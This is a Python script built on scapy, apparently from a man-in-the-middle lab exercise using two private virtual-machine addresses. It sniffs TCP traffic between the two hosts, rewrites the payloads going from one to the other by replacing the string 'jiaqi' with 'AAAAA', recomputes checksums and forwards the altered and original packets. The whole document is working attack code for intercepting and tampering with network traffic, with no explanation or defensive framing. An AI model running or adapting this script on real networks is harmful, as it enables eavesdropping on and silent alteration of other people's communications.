from scapy.all import *


import uuid

VM_A_IP = "172.16.133.128" 
VM_B_IP = "172.16.133.129"

def get_mac_address(): 
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:] 
    return ":".join([mac[e:e+2] for e in range(0,11,2)])

local_mac=get_mac_address()

def spoof_pkt(pkt):
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP \
        and pkt[TCP].payload:
        if pkt[TCP].payload.load and pkt[Ether].dst==local_mac:
            print ('A to B',pkt[TCP].payload.load)
            pkt.show()

            newpkt = IP(pkt[IP])
            del(newpkt.chksum)
            del(newpkt[TCP].chksum)
            del(newpkt[TCP].payload)

            olddata = pkt[TCP].payload.load # Get the original payload data
            newdata = olddata
            if "jiaqi" in olddata:
                print("need to replace")
                #newdata=olddata.replace("jiaqi","AAAAA")
                newdata=olddata.replace("jiaqi","AAAAA")

            send(newpkt/newdata)
            c=newpkt/newdata
            c.show()

    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
        if pkt[Ether].dst==local_mac:
            print ('B to A',pkt[TCP].payload)
            pkt.show()
            send(pkt[IP]) # Forward the original packet
pkt = sniff(filter='tcp',prn=spoof_pkt)

